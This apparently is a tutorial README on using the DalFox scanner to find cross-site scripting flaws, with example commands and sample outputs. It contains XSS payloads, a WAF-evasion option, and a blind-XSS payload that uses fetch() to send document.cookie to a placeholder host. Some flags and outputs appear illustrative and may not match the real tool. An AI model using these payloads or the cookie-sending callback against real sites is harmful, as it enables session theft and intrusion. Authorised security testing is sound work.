# DalFox-for-XSS
Here are detailed examples of how to use **DalFox** for XSS scanning and vulnerability hunting. Each example focuses on a different use case or feature of the tool:

---

### **1. Scan a Single URL**
This scans a single URL for potential XSS vulnerabilities.

#### Command:
```bash
dalfox url "http://example.com?search=test"
```

#### Example Output:
```plaintext
[INFO] Scanning Target: http://example.com?search=test
[RESULT] Found XSS Payload: http://example.com?search=<script>alert(1)</script>
```

---

### **2. Scan Multiple URLs from a File**
You can scan a list of URLs saved in a file.

#### Command:
```bash
dalfox file urls.txt
```

#### Example `urls.txt` File:
```plaintext
http://example.com?search=test
http://example.com?query=value
```

#### Output:
```plaintext
[INFO] Starting File Mode
[RESULT] Found XSS on http://example.com?search=<svg/onload=alert(1)>
[RESULT] Found XSS on http://example.com?query=<script>alert('XSS')</script>
```

---

### **3. Pipe URLs into DalFox**
Combine tools like **gau** or **waybackurls** to feed URLs into DalFox.

#### Command:
```bash
gau example.com | dalfox pipe
```

#### Output:
```plaintext
[INFO] Scanning Target: http://example.com?param=test
[RESULT] Found XSS Payload: http://example.com?param=<img src=x onerror=alert(1)>
```

---

### **4. Use Custom Payloads**
You can specify your payloads for the scan.

#### Command:
```bash
dalfox url "http://example.com?query=test" --custom-payload custom_payloads.txt
```

#### Example `custom_payloads.txt` File:
```plaintext
<svg/onload=alert(1)>
"><script>alert(document.cookie)</script>
```

#### Output:
```plaintext
[INFO] Using Custom Payloads
[RESULT] Found XSS Payload: http://example.com?query=<svg/onload=alert(1)>
```

---

### **5. Generate a JSON Report**
Save the results in JSON format for further analysis.

#### Command:
```bash
dalfox url "http://example.com?search=test" -o result.json
```

#### Example Output File (`result.json`):
```json
{
  "results": [
    {
      "type": "xss",
      "url": "http://example.com?search=<script>alert(1)</script>"
    }
  ]
}
```

---

### **6. Silent Mode for Scripting**
Use silent mode to suppress non-essential output.

#### Command:
```bash
dalfox url "http://example.com?search=test" -s
```

#### Output:
```plaintext
[RESULT] Found XSS Payload: http://example.com?search=<script>alert(1)</script>
```

---

### **7. Param Mining**
Discover injectable parameters on a target website.

#### Command:
```bash
dalfox url "http://example.com" --mining-dict
```

#### Output:
```plaintext
[INFO] Found Parameter: search
[INFO] Found Parameter: id
```

---

### **8. Blind XSS**
Test for blind XSS using a payload that sends data to your server.

#### Command:
```bash
dalfox url "http://example.com?search=test" --blind "http://yourserver.com/callback"
```

#### Example Payload Sent:
```plaintext
<svg/onload="fetch('http://yourserver.com/callback?cookie='+document.cookie)">
```

---

### **9. Follow Redirects**
Follow HTTP redirects during a scan.

#### Command:
```bash
dalfox url "http://example.com?param=test" --follow-redirects
```

#### Output:
```plaintext
[INFO] Redirect Detected: http://example.com/redirected
[RESULT] Found XSS Payload: http://example.com/redirected?param=<script>alert(1)</script>
```

---

### **10. Scan with Delay Between Requests**
Add a delay between HTTP requests to avoid rate-limiting.

#### Command:
```bash
dalfox url "http://example.com?search=test" --delay 500
```

- `--delay 500`: Adds a 500-millisecond delay between requests.

---

### **11. Scan URLs with Headers**
Include custom HTTP headers during a scan.

#### Command:
```bash
dalfox url "http://example.com?search=test" --header "Authorization: Bearer token123"
```

---

### **12. Parameter Discovery**
Find additional parameters on a web page.

#### Command:
```bash
dalfox url "http://example.com" --param-mining
```

#### Output:
```plaintext
[INFO] Found Parameters: search, id, action
```

---

### **13. DOM XSS Testing**
DalFox can test for DOM-based XSS.

#### Command:
```bash
dalfox url "http://example.com" --dom
```

---

### **14. Recursive Scanning**
Automatically find and scan links on a web page.

#### Command:
```bash
dalfox url "http://example.com" --crawl
```

#### Output:
```plaintext
[INFO] Found Link: http://example.com/page?param=test
[RESULT] Found XSS Payload: http://example.com/page?param=<script>alert(1)</script>
```

---

### **15. Evade WAFs**
Use WAF bypass techniques for testing.

#### Command:
```bash
dalfox url "http://example.com?query=test" --waf-evasion
```

#### Output:
```plaintext
[INFO] WAF Evasion Techniques Enabled
[RESULT] Found XSS Payload: http://example.com?query=%3Cscript%3Ealert%281%29%3C/script%3E
```

---

These examples demonstrate the flexibility of DalFox for detecting and exploiting XSS vulnerabilities. Let me know if you need further help or more examples!
